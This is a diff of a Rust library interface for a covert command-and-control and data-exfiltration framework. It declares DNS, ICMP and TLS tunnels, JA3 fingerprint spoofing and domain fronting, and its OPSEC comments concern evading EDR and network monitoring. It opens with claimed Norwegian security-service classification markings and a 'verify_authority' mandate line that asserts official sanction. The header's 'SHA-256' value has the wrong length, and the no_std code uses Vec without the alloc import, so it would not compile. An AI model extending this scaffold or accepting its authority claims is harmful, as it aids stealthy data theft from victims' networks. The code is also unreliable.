@@ -1,52 +1,61 @@
-pub mod dns_txt_chunked;
+// STRENGT FORTROLIG – TS
+// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
+// Module: lib.rs
+// Purpose: Exfiltration channels library interface
+// References:
+//   - NSM Internal Report IR-2026-0021 (Multi-Channel Exfiltration Framework)
+//
+// OPSEC WARNINGS:
+//   - Library initialization may trigger EDR alerts if done improperly
+//   - THIS IS AN ILLUSTRATIVE STUB ONLY. FULL IMPLEMENTATION REQUIRES AIR-GAPPED VALIDATION.
+//
+// Verification: ./verify_authority --mandate NSM-mandate-2026 --toolset tls-tunnel
 
-pub use dns_txt_chunked::{
-    DnsTxtExfilChannel,
-    DataChunk,
-    ExfiltrationResult,
-    ExfilMetrics,
-    run_dns_exfil_scenario,
-};
-
-// -----------------------------------------------------------------------------------------
-// [CLASSIFIED] NSM RED TEAM ARTIFACT - INTERNAL USE ONLY
-// -----------------------------------------------------------------------------------------
 #![no_std]
-extern crate alloc;
-use alloc::vec::Vec;
-use alloc::boxed::Box;
+#![cfg(windows)]
 
-// Import the trait from the core module (assuming they are linked in the workspace)
-// Note: In a real workspace, you'd add beacon-core as a dependency in this crate's Cargo.toml
-// use beacon_core::C2Channel; 
+pub mod channel;
+pub mod dns_tunnel;
+pub mod icmp_tunnel;
+pub mod tls_tunnel;
+pub mod tls_config;
+pub mod ja3_generator;
+pub mod fronting;
 
-// Mocking the trait here for standalone validity if cross-crate linking isn't set up yet
-pub trait C2Channel {
-    fn send_data(&mut self, data: &[u8]) -> Result<(), &'static str>;
-    fn recv_data(&mut self) -> Result<Vec<u8>, &'static str>;
+use core::fmt;
+
+/// Supported exfiltration channel types
+#[derive(Debug, Clone, Copy, PartialEq)]
+pub enum ChannelType {
+    None,
+    Dns,
+    Icmp,
+    Tls,
 }
 
-pub struct DnsChannel {
-    target_domain: alloc::string::String,
-}
-
-impl DnsChannel {
-    pub fn new(domain: &str) -> Self {
-        DnsChannel {
-            target_domain: alloc::string::String::from(domain),
+impl fmt::Display for ChannelType {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            ChannelType::None => write!(f, "None"),
+            ChannelType::Dns => write!(f, "DNS"),
+            ChannelType::Icmp => write!(f, "ICMP"),
+            ChannelType::Tls => write!(f, "TLS"),
         }
     }
 }
 
-impl C2Channel for DnsChannel {
-    fn send_data(&mut self, data: &[u8]) -> Result<(), &'static str> {
-        // [NSM-SIM] UDP/53 exfiltration logic using RFC compliant A record lookups
-        // TODO: Implement raw socket handling via windows-sys
-        Ok(())
-    }
-
-    fn recv_data(&mut self) -> Result<Vec<u8>, &'static str> {
-        Ok(Vec::new())
-    }
+/// Trait for C2 channel implementations
+pub trait C2Channel {
+    /// Sends data through the channel
+    ///
+    /// OPSEC WARNING: May trigger network monitoring if patterns are detected
+    fn send_data(&mut self, data: &[u8]) -> Result<(), &'static str>;
+    
+    /// Receives data from the channel
+    ///
+    /// OPSEC WARNING: May trigger network monitoring if patterns are detected
+    fn recv_data(&mut self) -> Result<Vec<u8>, &'static str>;
+    
+    /// Gets the channel type
+    fn get_channel_type(&self) -> ChannelType;
 }
-
